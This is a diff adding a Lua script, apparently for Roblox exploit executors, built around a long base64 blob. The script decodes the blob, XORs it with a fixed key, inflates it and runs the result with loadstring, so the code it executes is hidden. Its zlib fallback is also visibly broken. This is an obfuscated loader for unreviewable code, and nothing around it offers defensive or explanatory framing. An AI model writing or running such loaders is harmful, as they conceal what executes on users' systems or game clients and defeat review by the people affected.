@@ -1,0 +1,28 @@
+
+local qzjwlFnJ = "Gf3UeToOwrmYXN6DbctUGacQR1Io8jn69G15EmZ6PuGIzWWnV99hZ2Kn7ccLPps1FLq0yW40yszLN4s6frq+8l6xn+Xj/GJZ+vw9y3846BzfmpQdhn1+Xtnv7+5guKTF9N85fFztHx3VFSabc1nwy02HikjZZyl5y5IFyRR7RkaTIXzVZlzK/y29yKcO9fLh63g4d7tG5S7wIls9/P3//Pw+/zzcGhYQGBAYlI+Dg5OVZfpbwji11u42bb+QBVQlD4RtWHt+zXfcNW8GVQQyfe57gMOMFGlbIHBpJMsxTBdz07nJ+sjkfVyr/7WfBypXkC++Zlbem28p70GRHQFjNvA9XqVXLpFrVzrv9clCxYNef+AV3Ca///62L06uCgaO8W5BMkppTEjDCWrIvAP9P/20T761M6U67Qgp5dNz+Fgnp4IMl6hxU+2pKumg+wZr7dK7L7GYujp/en9yqBEhxXn+f4xmBNoTDHJWa+ZtNuBVPqZSIS4jy0p4Vzls4+918EcB5iLb2LhlLhGuRRUnoK0UIaEAHDgoI9UI0foPAfi0/HwaTTd3tAGtiFSxQ1eltfhaVNHF7AXYfLjICPHFUH87/NRcecJOuGzE50qjYdmJlJuj1xrsrW3IdPp60OPD9CDRNLn0c97Pt0svUdK3opiTtELXSjSFhD/QuGVZD/EKZ2MKjWEefeXfYpEJyA92wzZiaedmixUPFnFRF63C8yjK4TUi7gzGi4ZdixThtfGNflXS1WSMTJA5aQxK9+wvq2LHuBqplmIRnPOZ3Ik6nEEvTIYR1bKP8FiAetC4fw2oXb/aQ/j7mxe4Pu//cp0XqSiALZAwsrVEQnOoCzg82bg5LSkS2G9FdcghDh2UFIt/xTtnoKHcr33245PFId9IZNQfPUwfnEWMdy6QYcgbTYjSStGFtkCP0qcS7Y9uBv101cIaUt8mgdPyUThSrPwygfRxlEePqDBx4Iq8B9dBDKiTq+YnD4yvFRMoT1ENuiPLCP8d6JP6TsG+LM7cJ8sgOTLucCp7XNQh6utKtIBi+ggIH5wCkJyLZeuam4QiZ+p6rv8Af29J5j4UyQxuBd0hZByxNGSECcSQ17AfZ4TgrZBBgY0JlRHxHyWTnJUYtaHxAwYoqsBvo1a2eQtLDFduRXXr364cPsi2Sz8mMR3SJB0ZPNm8KTUghQcZt1d+U4BIjY+5Eh3BXkhqs3uWudUTj3BiPBOmsvEJpphPJqBUEBD3RdQTotyG3UuWTTn31N19C9gGCtjZBleBzHNSyw7JoaEYBnNNWqHsJrwIpZWTMIRobKgV5n9Oa7IdI+CCKduQR0cojYtM135LgXXTlhpnDNevvvGFf2tGcWlCqLLKsspcba9/cRcbKPM29ho5/+/xTTou+DDNUC8VhI9juapAclF9mP0PTeUI5jrVGokyQjaPu7U3bIfzWKgnMm8+EsCGtDqr5wzI7+RDTksjzSUPg2XsKxIlsGovwXp0SMUE7RUUxTexZUygj63oVDtkzqCkyhZeHJLHTWfXrTVtbb8aya+PvebaFIm6E1tKQASXNRP8plo610iX3dkkB+KDHt+ej65h1ajIqRcId/kSo2hFLGPbX6Sas3diUqITuc/AYMlaYVbemf2TBsSX4UWbZCjvYUxOIXrgB0dZ5mJBR+uFzBpEYOAGEodlRmtTENl9zgRMT9/VVDsS3F99GdK0cFU6twJWUoOH7h5mrylS81QOYhN41sRk+mEC25dZQoc/4XWfUix0VzA6PL8dn4SeiDIzz3VVmdRhZ/xscEstkkFHuJtpRyokoOYP1e6tjp9rGX8SEavUsuXoldBcf9TTyjFfZgVyAg+4yjbauJBh+Ywcyxwwqw7eZo8dh5u8DI4xKx/XvkaEYZnB9fpenZ++npt3KazkB2UCjTEvMBFCfA4Why23E4Z6oqaaA5ZAjB6SbsEUZff2YpfxCjDdroGbjF4Wi7+XtiKnmNgR/jpv4Ra9M5tLbfnxwx2IZkhBrzt6vNCDLWwric5p9+igVzUjsLY50dSG28coEzvgHmBaGNFofPvSgZD/WztJFg+GQyKyoFlXi22vFIT0W07PiF1MV5QFjLcUtgJc0NIka9Tulx6qYgoh+6AF9bwGgXTdUAF1ALPuu4km0Y3keUpMyK3bw2IcY/4P7qyVW1SBVt+h5LWPS/Tq49qJwDJVB3pbAOPEnYHaosDconDgLHxGihNpoJvM7yUIqUDrLG/YDLY7jRUb7klcErw/RrnQ3uk7cjyXshoSK82LjCW6K5PoBa92d4YuHvG2ouCM7eiVVxH8GsCRtd8O5iut8tdFhJpDTCTHJKdJXeGxi0AuiaIHvlO3HLIhElISQGQkW12NHgUypTJHaANK2mLuvuMBDfiSNJZIjlz6H661CBYTVSgu/QMna7YVsqAJbq198dF7qPBA5oduVH8irWU+gLALVFzEAYlALEIwbTM5mHx1OBilUSntMFvwfIWiP1dN0LWE8df/uVL39KIHwqQP0URA2kT2x1NBKOK3gjcqdWl16HeDF6VuUnjbAr/mUEaHV7Yr+do7BWq7PrOAYS/MSVI5GitYK+Yg2xwiqXiEQzkApzscTSfw+l6cezlffglKCmV3d8cREFZjw6GtWlUOYR5D1ew4qeFFsVFraol2KZiL3XayPDFo31WaCbukX55shVxl754BpQ9lyHbJAXgYErwrd+zV3CDMe8O/0g0njsZAGhU/yOJvhvOcplxnISiUoBl9zYetx0AKe7R7FYnDWxHm/NMM+ql+PlUI4M4VJktBgYYI1FNipzgyy+N9Xakhrr5bffP1Y2wOMdbg3+Zxc+CKioMskF+9s+JCxdiOo5+5mFME8t51fRuAHnk4FmyC3uBRLmA="
+
+local function QcHwgrVi(data, key)
+    local out = {}
+    for i = 1, #data do
+        out[i] = string.char(string.byte(data, i) ~ key)
+    end
+    return table.concat(out)
+end
+
+local function vTzJVIOH(b64)
+    local s = b64:gsub("[^A-Za-z0-9+/=]", "")
+    return syn and syn.crypt.base64.decode(s) or game:GetService("HttpService"):Base64Decode(s)
+end
+
+local MGAyuPwy = zlib and zlib.inflate or function()
+    return (function(input)
+        local result = ''
+        local ok, res = pcall(function()
+            return zlib.inflate()(input)
+        end)
+        return ok and res or input
+    end)
+end
+
+local exec = loadstring(MGAyuPwy()(QcHwgrVi(vTzJVIOH(qzjwlFnJ), 97)))
+if exec then exec() end
